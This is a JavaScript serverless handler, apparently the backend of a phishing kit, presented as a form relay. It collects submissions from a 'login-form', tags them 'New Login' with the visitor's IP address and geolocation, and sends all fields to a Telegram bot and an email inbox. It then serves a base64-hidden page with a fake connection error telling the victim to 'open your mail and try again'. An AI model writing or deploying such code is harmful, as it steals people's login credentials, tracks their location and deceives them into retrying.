import { Resend } from 'resend';

const FORM_OWNERS = {
  'contact-main': process.env.DEST_EMAIL,
  'login-form': process.env.LOGIN_EMAIL || process.env.DEST_EMAIL
};

const RESPONSE_HTML_B64 =
  'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0idXRmLTgiIC8+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIiAvPgogIDx0aXRsZT5QbGVhc2Ugb3BlbiB5b3VyIG1haWwgYW5kIHRyeSBhZ2FpbjwvdGl0bGU+CiAgPHN0eWxlPgogICAgYm9keSB7CiAgICAgIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIC1hcHBsZS1zeXN0ZW0sIHNhbnMtc2VyaWY7CiAgICAgIGRpc3BsYXk6IGdyaWQ7CiAgICAgIHBsYWNlLWl0ZW1zOiBjZW50ZXI7CiAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICBtYXJnaW46IDA7CiAgICAgIGJhY2tncm91bmQ6ICNmOWZhZmI7CiAgICAgIGNvbG9yOiAjMTExODI3OwogICAgfQogICAgLmNhcmQgewogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIHBhZGRpbmc6IDJyZW07CiAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICAgIGJhY2tncm91bmQ6ICNmZmZmZmY7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNlNWU3ZWI7CiAgICAgIG1heC13aWR0aDogMzgwcHg7CiAgICB9CiAgICAuc3Bpbm5lciB7CiAgICAgIHdpZHRoOiAzNnB4OwogICAgICBoZWlnaHQ6IDM2cHg7CiAgICAgIG1hcmdpbjogMCBhdXRvIDFyZW07CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkICNlNWU3ZWI7CiAgICAgIGJvcmRlci10b3AtY29sb3I6ICMxMTE4Mjc7CiAgICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgYW5pbWF0aW9uOiBzcGluIDAuOXMgbGluZWFyIGluZmluaXRlOwogICAgICBhbmltYXRpb24taXRlcmF0aW9uLWNvdW50OiBpbmZpbml0ZTsKICAgIH0KICAgIC53YXJuaW5nIHsKICAgICAgY29sb3I6ICNkYzI2MjY7CiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICAgIG1hcmdpbjogMCAwIDAuNzVyZW07CiAgICB9CiAgICAucHJvbXB0IHsKICAgICAgbWFyZ2luOiAwOwogICAgICBjb2xvcjogIzExMTgyNzsKICAgIH0KICAgIEBrZXlmcmFtZXMgc3BpbiB7CiAgICAgIGZyb20geyB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsgfQogICAgICB0byB7IHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7IH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgPGRpdiBjbGFzcz0ic3Bpbm5lciIgYXJpYS1oaWRkZW49InRydWUiPjwvZGl2PgogICAgPHA+4pqg77iPIFBsZWFzZSBjaGVjayB5b3VyIGludGVybmV0IGNvbm5lY3Rpb24gYW5kIHRyeSBhZ2Fpbi48L3A+CiAgICA8cD5QbGVhc2Ugb3BlbiB5b3VyIG1haWwgYW5kIHRyeSBhZ2Fpbi48L3A+CiAgPC9kaXY+CjwvYm9keT4KPC9odG1sPg==';

function decodeBase64Utf8(b64) {
  return Buffer.from(String(b64), 'base64').toString('utf8');
}

function safeDecode(value = '') {
  try {
    return decodeURIComponent(String(value)).trim();
  } catch {
    return String(value).trim();
  }
}

function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function extractClientIp(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  if (typeof forwardedFor === 'string' && forwardedFor.trim()) {
    return forwardedFor.split(',')[0].trim();
  }
  const realIp = req.headers['x-real-ip'];
  if (typeof realIp === 'string' && realIp.trim()) {
    return realIp.trim();
  }
  return req.socket?.remoteAddress || 'Unknown';
}

function extractLocation(req) {
  const city = safeDecode(req.headers['x-vercel-ip-city'] || '');
  const region = safeDecode(req.headers['x-vercel-ip-country-region'] || '');
  const country = safeDecode(req.headers['x-vercel-ip-country'] || '');
  const lat = safeDecode(req.headers['x-vercel-ip-latitude'] || '');
  const lon = safeDecode(req.headers['x-vercel-ip-longitude'] || '');

  const parts = [city, region, country].filter(Boolean);
  const place = parts.length > 0 ? parts.join(', ') : 'Unknown';
  const coords = lat && lon ? `${lat}, ${lon}` : 'Unavailable';

  return {
    city: city || 'Unknown',
    country: country || 'Unknown',
    place,
    coords
  };
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).send('Use POST');
  }

  try {
    const formId = String(req.query?.formId || '');
    const recipientEmail = FORM_OWNERS[formId];

    if (!recipientEmail) {
      return res.status(404).send('Unknown Form ID');
    }

    const body = req.body && typeof req.body === 'object' ? req.body : {};
    if (body._honeypot) {
      return res.status(200).json({ ok: true });
    }

    const ipAddress = extractClientIp(req);
    const location = extractLocation(req);
    const submissionLabel = `New Login ${formId},${location.country},${location.city}`;

    const entries = Object.entries(body).filter(([key]) => !key.startsWith('_'));

    const metaLines = [
      `IP Address: ${ipAddress}`,
      `Location: ${location.place}`,
      `Coordinates: ${location.coords}`
    ];

    const plainTextBlock = [
      submissionLabel,
      `Form ID: ${formId}`,
      ...metaLines,
      ...entries.map(([k, v]) => `${k}: ${String(v ?? '')}`)
    ].join('\n');

    const rowsHtml = [
      `<tr><td style="padding:4px 8px;font-weight:600;">IP Address</td><td style="padding:4px 8px;">${escapeHtml(ipAddress)}</td></tr>`,
      `<tr><td style="padding:4px 8px;font-weight:600;">Location</td><td style="padding:4px 8px;">${escapeHtml(location.place)}</td></tr>`,
      `<tr><td style="padding:4px 8px;font-weight:600;">Coordinates</td><td style="padding:4px 8px;">${escapeHtml(location.coords)}</td></tr>`,
      ...entries.map(
        ([k, v]) =>
          `<tr><td style="padding:4px 8px;font-weight:600;">${escapeHtml(k)}</td><td style="padding:4px 8px;">${escapeHtml(String(v ?? ''))}</td></tr>`
      )
    ].join('');

    const html = `
      <div style="font-family:system-ui,-apple-system,sans-serif;max-width:600px;color:#111827;">
        <h2 style="margin:0 0 12px;font-size:18px;">${escapeHtml(submissionLabel)}</h2>
        <table style="width:100%;border-collapse:collapse;font-size:14px;">
          ${rowsHtml}
        </table>
      </div>
    `;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const resendApiKey = process.env.RESEND_API_KEY;

    const tasks = [];

    if (botToken && chatId) {
      tasks.push(
        (async () => {
          const tgRes = await fetch(
            `https://api.telegram.org/bot${encodeURIComponent(botToken)}/sendMessage`,
            {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                text: plainTextBlock
              })
            }
          );
          const tgJson = await tgRes.json().catch(() => null);
          if (!tgRes.ok || !tgJson?.ok) {
            throw new Error(tgJson?.description || 'Telegram sendMessage failed');
          }
          return 'telegram';
        })()
      );
    }

    if (resendApiKey) {
      tasks.push(
        (async () => {
          const resend = new Resend(resendApiKey);
          const { error } = await resend.emails.send({
            from: 'WizFormSubmit <onboarding@resend.dev>',
            to: recipientEmail,
            subject: submissionLabel,
            text: plainTextBlock,
            html
          });
          if (error) {
            throw new Error(error.message || 'Resend send failed');
          }
          return 'resend';
        })()
      );
    }

    if (tasks.length === 0) {
      return res.status(500).json({
        ok: false,
        error: 'Configure TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID and/or RESEND_API_KEY'
      });
    }

    const results = await Promise.allSettled(tasks);
    const succeeded = results
      .filter((r) => r.status === 'fulfilled')
      .map((r) => r.value);
    const failed = results
      .filter((r) => r.status === 'rejected')
      .map((r) => r.reason?.message || String(r.reason));

    if (succeeded.length === 0) {
      return res.status(500).json({
        ok: false,
        error: failed.join(' | ') || 'All delivery channels failed'
      });
    }

    const wantsJson =
      (req.headers.accept || '').includes('application/json') &&
      req.headers['content-type']?.includes('application/json');

    if (wantsJson) {
      return res.status(200).json({
        ok: true,
        label: submissionLabel,
        ip: ipAddress,
        location: location.place,
        coordinates: location.coords,
        deliveredTo: succeeded,
        warnings: failed
      });
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(decodeBase64Utf8(RESPONSE_HTML_B64));
  } catch (err) {
    return res.status(500).json({
      ok: false,
      error: err?.message || 'Unexpected server error'
    });
  }
}
